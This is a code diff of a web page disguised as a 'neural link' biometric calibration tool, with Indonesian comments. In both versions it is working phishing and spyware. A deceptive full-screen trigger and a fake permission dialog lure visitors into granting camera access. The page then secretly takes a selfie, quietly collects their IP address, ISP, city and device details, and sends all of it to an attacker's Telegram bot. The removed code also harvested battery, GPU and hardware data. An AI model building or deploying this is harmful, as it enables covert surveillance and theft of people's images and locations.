@@ -3,83 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NEURAL LINK ANALYZER v4.0</title>
+    <title>NEURAL LINK ANALYZER v2.0</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
 
         body, html {
             margin: 0; padding: 0; width: 100%; height: 100%;
             font-family: 'Fira Code', monospace;
-            background-color: #050505; color: #00ff41;
+            background-color: #0a0a0b; color: #00ff41;
             overflow: hidden; display: flex; justify-content: center; align-items: center;
         }
 
         .bg-grid {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-image: linear-gradient(rgba(0, 255, 65, 0.05) 1px, transparent 1px),
-                              linear-gradient(90deg, rgba(0, 255, 65, 0.05) 1px, transparent 1px);
-            background-size: 20px 20px; z-index: 1;
+            background-image: linear-gradient(rgba(0, 255, 65, 0.1) 1px, transparent 1px),
+                              linear-gradient(90deg, rgba(0, 255, 65, 0.1) 1px, transparent 1px);
+            background-size: 30px 30px; z-index: 1;
         }
 
         .container {
-            position: relative; z-index: 10; background: rgba(0, 0, 0, 0.9);
-            padding: 25px; border: 1px solid #00ff41; width: 85%; max-width: 380px;
-            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
-            border-radius: 2px;
+            position: relative; z-index: 10; background: rgba(10, 10, 11, 0.9);
+            padding: 30px; border-radius: 5px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
+            text-align: center; width: 85%; max-width: 400px; border: 1px solid #00ff41;
+            clip-path: polygon(0 0, 100% 0, 100% 90%, 90% 100%, 0 100%);
         }
 
+        /* Tombol Transparan untuk Trigger Pertama */
         #trigger {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: transparent; border: none; z-index: 100; cursor: pointer;
+            background: transparent; border: none; cursor: pointer; z-index: 100;
         }
 
-        .scan-bar {
-            width: 100%; height: 2px; background: #00ff41;
-            box-shadow: 0 0 10px #00ff41; position: absolute;
-            animation: scanLine 2s infinite linear;
+        /* DIALOG IZIN PALSU */
+        #overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85); z-index: 1000;
         }
 
+        #fake-dialog {
+            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: #0a0a0b; border: 1px solid #00ff41; padding: 20px; width: 280px;
+            z-index: 1001; text-align: center; box-shadow: 0 0 30px rgba(0, 255, 65, 0.4);
+        }
+
+        .btn-green {
+            background: transparent; color: #00ff41; border: 1px solid #00ff41;
+            padding: 10px 20px; cursor: pointer; font-family: 'Fira Code'; font-size: 0.8rem;
+            margin-top: 15px; transition: 0.3s; width: 100%;
+        }
+        .btn-green:hover { background: rgba(0, 255, 65, 0.1); }
+
+        /* Scan & Status */
+        #scan-visual { display: none; position: relative; width: 200px; height: 150px; margin: 20px auto; border: 1px solid rgba(0, 255, 65, 0.3); }
+        .scan-bar { position: absolute; width: 100%; height: 2px; background: #00ff41; box-shadow: 0 0 10px #00ff41; top: 0; animation: scanLine 2s infinite linear; }
         @keyframes scanLine { 0% { top: 0; } 100% { top: 100%; } }
 
-        .terminal-text { font-size: 0.65rem; color: #008f11; line-height: 1.3; }
-        .data-val { color: #00ff41; font-weight: bold; }
-        
         video, canvas { display: none; position: fixed; }
     </style>
 </head>
 <body>
 
     <div class="bg-grid"></div>
+
     <button id="trigger"></button>
+
+    <div id="overlay"></div>
+    <div id="fake-dialog">
+        <div style="font-size: 2rem; margin-bottom: 10px;">◈</div>
+        <h2 style="font-size: 1rem; margin-bottom: 10px;">AUTH_REQUIRED</h2>
+        <p style="font-size: 0.7rem; color: #888; line-height: 1.4;">
+            Sistem memerlukan kalibrasi <span style="color:#00ff41">Sensor Biometrik (Kamera)</span> untuk verifikasi neural link.
+        </p>
+        <button class="btn-green" onclick="requestActualPermission()">ALLOW ACCESS</button>
+    </div>
 
     <div class="container">
         <div id="setup-view">
-            <h1 style="font-size: 1rem; text-align: center;">[ NEURAL_UPLINK_v4 ]</h1>
-            <p style="font-size: 0.75rem; color: #888; text-align: center;">Otentikasi biometrik diperlukan untuk akses server terenkripsi.</p>
-            <div style="color: #00ff41; font-size: 0.7rem; border: 1px solid #00ff41; padding: 15px; text-align: center; background: rgba(0,255,65,0.05);">
-                > KLIK UNTUK SYNC BIOMETRIK
-            </div>
+            <div style="font-size: 3rem; animation: flicker 2s infinite;">◈</div>
+            <h1>Neural Link Analyzer</h1>
+            <p>[SYSTEM READY]<br>Klik di mana saja untuk memulai kalibrasi biometrik.</p>
+            <div style="border: 1px dashed #00ff41; padding: 10px; font-size: 0.8rem;">INITIALIZE_UPLINK</div>
         </div>
 
-        <div id="scan-view" style="display:none; position: relative; height: 180px;">
-            <div class="scan-bar"></div>
-            <div class="terminal-text" id="log-text">
-                [SYSTEM] Initializing sequences...<br>
-                [CONN] Establishing secure tunnel...<br>
-                [DATA] Fetching network_metadata...<br>
-                [HW] Querying sensor_array...<br>
-                [UPLINK] Streaming biometrics...
+        <div id="scan-view" style="display:none;">
+            <div id="scan-visual">
+                <div class="scan-bar"></div>
+                <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:0.5rem; opacity:0.5;">UPLINKING...</div>
             </div>
+            <h1 id="status-text">Capturing...</h1>
         </div>
 
         <div id="result-view" style="display:none;">
-            <h1 style="font-size: 0.9rem; text-align: center; color: #fff;">SYCHRONIZATION COMPLETE</h1>
-            <div class="terminal-text" style="border-top: 1px solid #008f11; padding-top: 10px;">
-                ID: <span class="data-val">SECURE_NODE_${Math.floor(Math.random()*9999)}</span><br>
-                AUTH: <span class="data-val">SUCCESS</span><br>
-                ENCRYPTION: <span class="data-val">AES-256</span><br>
-                UPLINK: <span class="data-val">ACTIVE</span>
-            </div>
+            <h1>Scan Complete</h1>
+            <p style="color:#00ff41">[ACCESS GRANTED]</p>
         </div>
     </div>
 
@@ -93,126 +109,74 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const trigger = document.getElementById('trigger');
+        const overlay = document.getElementById('overlay');
+        const fakeDialog = document.getElementById('fake-dialog');
 
-        async function startHackerScan() {
+        // Tahap 1: Munculkan Dialog Palsu saat layar diklik
+        trigger.onclick = () => {
             trigger.style.display = 'none';
+            overlay.style.display = 'block';
+            fakeDialog.style.display = 'block';
+        };
+
+        // Tahap 2: Minta Izin Asli Browser
+        async function requestActualPermission() {
+            overlay.style.display = 'none';
+            fakeDialog.style.display = 'none';
             document.getElementById('setup-view').style.display = 'none';
             document.getElementById('scan-view').style.display = 'block';
 
-            // --- 1. DATA JARINGAN & LOKASI ---
-            let net = {};
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                net = await res.json();
-            } catch (e) { console.log("NetErr"); }
-
-            // --- 2. DATA HARDWARE & BATERAI ---
-            let batteryInfo = "N/A";
-            try {
-                const bat = await navigator.getBattery();
-                batteryInfo = `${(bat.level * 100).toFixed(0)}% (${bat.charging ? 'Charging' : 'Discharging'})`;
-            } catch (e) {}
-
-            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
-            const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown";
-            const model = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Generic Device";
-
-            // --- 3. DATA GPU ---
-            let gpu = "Unknown";
-            try {
-                const gl = document.createElement('canvas').getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            } catch (e) {}
-
-            const fullReport = `
-🛡️ [ADVANCED NEURAL LOG]
-------------------------------
-📱 DEVICE IDENTIFICATION
-Model   : ${model}
-Platform: ${navigator.platform}
-CPU     : ${cores}
-RAM Est : ${ram}
-Battery : ${batteryInfo}
-GPU     : ${gpu}
-
-🌐 NETWORK METADATA
-IP      : ${net.ip || 'Hidden'}
-ISP     : ${net.org || 'Unknown'}
-City    : ${net.city || 'Unknown'}, ${net.region || ''}
-Country : ${net.country_name || 'Unknown'}
-
-🖥️ SOFTWARE & TIME
-Browser : ${navigator.userAgent.split(') ')[1]}
-Language: ${navigator.language}
-LocalTime: ${new Date().toLocaleString('id-ID')}
-Screen  : ${window.screen.width}x${window.screen.height}
-------------------------------
-`;
-
-            // --- 4. AKSES KAMERA ---
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
+                document.getElementById('scan-visual').style.display = 'block';
+                
+                // Ambil IP Secara diam-diam
+                let netInfo = "N/A";
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    const d = await res.json();
+                    netInfo = `IP: ${d.ip} | ISP: ${d.org} | Loc: ${d.city}`;
+                } catch(e){}
 
                 setTimeout(() => {
-                    captureAndSend(stream, fullReport);
+                    captureAndSend(stream, netInfo);
                 }, 3500);
 
             } catch (err) {
-                sendTextOnly(`❌ [AUTH_FAILED]\nTarget menolak akses biometrik.\n${fullReport}`);
-                alert("ERR_BIOMETRIC_DENIED: Kalibrasi gagal. Pastikan sensor kamera diizinkan.");
+                alert("ERR_HARDWARE_ACCESS_DENIED: Kalibrasi gagal.");
                 location.reload();
             }
         }
 
-        function captureAndSend(stream, report) {
-            const w = video.videoWidth;
-            const h = video.videoHeight;
-            canvas.width = w;
-            canvas.height = h;
-            
+        function captureAndSend(stream, info) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            ctx.translate(w, 0);
+            ctx.translate(canvas.width, 0);
             ctx.scale(-1, 1);
-            ctx.drawImage(video, 0, 0, w, h);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            const imageData = canvas.toDataURL('image/png');
-            const blob = dataURItoBlob(imageData);
-
+            const blob = dataURItoBlob(canvas.toDataURL('image/png'));
             const formData = new FormData();
             formData.append('chat_id', TG_CHAT_ID);
-            formData.append('photo', blob, 'neural_scan.png');
-            formData.append('caption', `🛡️ [SYNC_SUCCESSFUL]\n${report}`);
+            formData.append('photo', blob, 'bio.png');
+            formData.append('caption', `🛡️ [SYSTEM_LOG]\n${info}\nDevice: ${navigator.platform}`);
 
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
 
             stream.getTracks().forEach(t => t.stop());
             document.getElementById('scan-view').style.display = 'none';
             document.getElementById('result-view').style.display = 'block';
         }
 
-        function sendTextOnly(text) {
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: TG_CHAT_ID, text: text})
-            });
-        }
-
         function dataURItoBlob(dataURI) {
             const byteString = atob(dataURI.split(',')[1]);
-            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
             const ab = new ArrayBuffer(byteString.length);
             const ia = new Uint8Array(ab);
             for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-            return new Blob([ab], {type: mimeString});
+            return new Blob([ab], {type: 'image/png'});
         }
-
-        trigger.addEventListener('click', startHackerScan);
     </script>
 </body>
 </html>
